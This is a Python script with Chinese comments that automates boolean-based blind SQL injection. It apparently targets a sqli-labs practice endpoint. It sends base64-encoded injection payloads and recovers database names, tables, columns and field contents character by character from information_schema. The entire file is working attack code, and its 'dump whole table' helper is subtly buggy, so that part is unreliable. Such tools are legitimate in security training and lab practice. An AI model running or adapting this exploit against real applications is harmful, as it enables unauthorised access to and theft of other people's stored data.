#!/usr/bin/python3
# -*- coding: utf-8 -*-

import base64
import requests
import optparse
from tabulate import tabulate

# 存放长度变量
Len = 0
# 存放数据库名
table_schema = []
# 存放数据库表
table_name = []
# 存放数据库字段
columns_name = []
# 存放数据字典变量,键为字段名，值为字段数据列表
columns_data = []

DBdata = [[]]
# 若页面返回真，则会出现You are in...........
flag = "那你就是诗人"
# 请求头的参数
header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
          "Origin": "xxxxxxx",
          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
          "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
          "Content-Type": "application/x-www-form-urlencoded", "Upgrade-Insecure-Requests": "1"}


def base64en(payld):
    res = base64.b64encode(payld.encode('utf-8'))
    return res.decode('utf-8')


# 设置重连次数以及将连接改为短连接
# 防止因为HTTP连接数过多导致的 Max retries exceeded with url
requests.adapters.DEFAULT_RETRIES = 5
conn = requests.session()
conn.keep_alive = False


# 盲注主函数
def StartSqli(url):

    GetDBName(url)  # 1.遍历数据库名

    print("[+]数据库如下")  # 打印数据库名
    for item in range(len(table_schema)):
        print("(" + str(item + 1) + ")" + table_schema[item])
    DBnum = int(input("[*]请输入要查看数据库的序号:")) - 1

    GetDBTables(url, table_schema[DBnum])  # 遍历数据库中表

    print("[+]数据库{0}的表如下:".format(table_schema[DBnum]))  # 打印表名
    for item in range(len(table_name)):
        print("(" + str(item + 1) + ")" + table_name[item])
    TABLEnum = int(input("[*]请输入要查看表的序号:")) - 1

    GetDBColumns(url, table_schema[DBnum], table_name[TABLEnum])  # 遍历表中字段
    print("[+]数据库{0}表{1}的字段如下:".format(table_schema[DBnum], table_name[TABLEnum]))  # 打印字段名
    for item in range(len(columns_name)):
        print("(" + str(item + 1) + ")" + columns_name[item])
    COLUMNSnum = int(input("[*]请输入要查看字段的序号:")) - 1

    GetDBData(url, table_schema[DBnum], table_name[TABLEnum], columns_name[COLUMNSnum])  # 遍历指定字段的数据列表
    print("[+]数据库{0}表{1}字段{2}的数据列表如下:".format(table_schema[DBnum], table_name[TABLEnum], columns_name[COLUMNSnum]))
    for item in range(len(columns_data)):
        print("(" + str(item + 1) + ")" + columns_data[item])
    # 直接打印该表的测试函数
    #GetDBDatas(url, table_schema[DBnum], table_name[TABLEnum])

# 获取长度
def Get_Len(url, len_payload):
    global Len
    print("[-]开始获取长度")
    for Len in range(1, 10000):
        # 使用format中的参数替换之前设置的占位符
        date = len_payload.format(Len)
        requests_body = 'id=' + base64en(date)
        # 填入请求头和请求体
        res = conn.post(url, data=requests_body, headers=header)
        # 判断flag是否在返回的页面中
        if flag in res.content.decode("utf-8"):
            print("[+]长度:" + str(Len))
            break

# 获取数据库名函数
def GetDBName(url):
    len_payload = """-1'%" or if((length((select group_concat(DISTINCT TABLE_SCHEMA) from information_schema.COLUMNS)) like {0}),1,0) or "%'"""
    print(len_payload)
    Get_Len(url, len_payload)  # 获取所以数据库总长度
    global Len
    global table_schema
    dbnames = ""

    print("[-]开始获取数据库名")
    payload = """-1'%" or if(((ascii(substr((select group_concat(DISTINCT TABLE_SCHEMA) from information_schema.COLUMNS),{0},1))) like {1}),1,0) or "%'"""
    for a in range(1, Len + 1):
        # b表示33~127位ASCII中可显示字符
        for b in range(33, 128):
            # 使用format中的参数替换之前设置的占位符
            date = payload.format(a, b)
            requests_body = 'id=' + base64en(date)
            res = conn.post(url, data=requests_body, headers=header)
            if flag in res.content.decode("utf-8"):
                dbnames += chr(b)
                print("[-]" + dbnames)
                break
    if "," in dbnames:
        db_n = dbnames.split(',')
        for tmp in db_n:
            if tmp not in table_schema:
                table_schema.append(tmp)
    else:
        table_schema.append(dbnames)

# 获取数据库表函数
def GetDBTables(url, dbname):
    len_payload = """-1'%" or if((length((select group_concat(DISTINCT TABLE_NAME) from information_schema.COLUMNS where table_schema = '""" + str(dbname) +"""')) like {0}),1,0) or "%'"""
    print(len_payload)
    Get_Len(url, len_payload)  # 获取所有表总长度
    global Len
    global table_name
    tables = ""

    print("[-]开始获取数据库{0}的表".format(dbname))
    payload = """-1'%" or if(((ascii(substr((select group_concat(DISTINCT TABLE_NAME) from information_schema.COLUMNS where table_schema = '{0}'),{1},1))) like {2}),1,0) or "%'"""
    for a in range(1, Len + 1):
        # b表示33~127位ASCII中可显示字符
        for b in range(33, 128):
            # 使用format中的参数替换之前设置的占位符
            date = payload.format(str(dbname), a, b)
            requests_body = 'id=' + base64en(date)
            res = conn.post(url, data=requests_body, headers=header)
            if flag in res.content.decode("utf-8"):
                tables += chr(b)
                print("[-]" + tables)
                break
    if "," in tables:
        db_n = tables.split(',')
        for tmp in db_n:
            if tmp not in table_name:
                table_name.append(tmp)
    else:
        table_name.append(tables)

# 获取数据库表的字段函数
def GetDBColumns(url, dbname, dbtable):
    len_payload = """-1'%" or if((length((select group_concat(DISTINCT COLUMN_NAME) from information_schema.COLUMNS where table_name = '""" + str(dbtable) + """')) like {0}),1,0) or "%'"""
    print(len_payload)
    Get_Len(url, len_payload)  # 获取所以数据库总长度
    global Len
    global columns_name
    columns = ""

    print("[-]开始获取数据库{0}表{1}的字段".format(dbname, dbtable))
    payload = """-1'%" or if(((ascii(substr((select group_concat(DISTINCT COLUMN_NAME) from information_schema.COLUMNS where table_name = '""" + str(dbtable) + """'),{0},1))) like {1}),1,0) or "%'"""
    for a in range(1, Len + 1):
        # b表示33~127位ASCII中可显示字符
        for b in range(33, 128):
            # 使用format中的参数替换之前设置的占位符
            date = payload.format(a, b)
            requests_body = 'id=' + base64en(date)
            res = conn.post(url, data=requests_body, headers=header)
            if flag in res.content.decode("utf-8"):
                columns += chr(b)
                print("[-]" + columns)
                break
    if "," in columns:
        db_n = columns.split(',')
        for tmp in db_n:
            if tmp not in columns_name:
                columns_name.append(tmp)
    else:
        columns_name.append(columns)

# 获取字段数据
def GetDBData(url, dbname, dbtable, dbcolumn):
    len_payload = """-1'%" or if((length((SELECT GROUP_CONCAT(`""" + str(dbcolumn) + """`) from """ + str(dbname) + """.""" + str(dbtable) + """)) like {0}),1,0) or "%'"""
    print(len_payload)
    Get_Len(url, len_payload)  # 获取所以数据库总长度
    global Len
    global columns_data
    dates = ""

    print("[-]开始获取数据库{0}表{1}字段{2}的数据".format(dbname, dbtable, dbcolumn))
    payload = """-1'%" or if(((ascii(substr((SELECT GROUP_CONCAT(`""" + str(dbcolumn) + """`) from """ + str(dbname) + """.""" + str(dbtable) + """),{0},1))) like {1}),1,0) or "%'"""
    for a in range(1, Len + 1):
        # b表示33~127位ASCII中可显示字符
        for b in range(33, 128):
            # 使用format中的参数替换之前设置的占位符
            date = payload.format(a, b)
            requests_body = 'id=' + base64en(date)
            res = conn.post(url, data=requests_body, headers=header)
            if flag in res.content.decode("utf-8"):
                dates += chr(b)
                print("[-]" + dates)
                break
    if "," in dates:
        db_n = dates.split(',')
        for tmp in db_n:
            if tmp not in columns_data:
                columns_data.append(tmp)
    else:
        columns_data.append(dates)

# 获取整个表
def GetDBDatas(url, dbname, dbtable):
    GetDBColumns(url, dbname, dbtable)
    global columns_name  # 长度为8
    GetDBData(url, dbname, dbtable, columns_name[2])
    global columns_data  # 长度为3
    test = [[] * len(columns_data)] * len(columns_name)

    for x in range(len(columns_data)):
        for y in range(len(columns_name)):
            GetDBData(url, dbname, dbtable, columns_name[y])
            test[y].append(columns_data)

    print(tabulate(test, headers=columns_name))

if __name__ == '__main__':
    parser = optparse.OptionParser('usage: python %prog -u url \n\n'
                                   'Example: python %prog -u http://192.168.61.1/sql/Less-8/?id=1\n')
    # 目标URL参数-u
    parser.add_option('-u', '--url', dest='targetURL', type='string',
                      help='target URL')
    (options, args) = parser.parse_args()
    if not options.targetURL:
        parser.error("输入-h 查看帮助信息")
    else:
        StartSqli(options.targetURL)

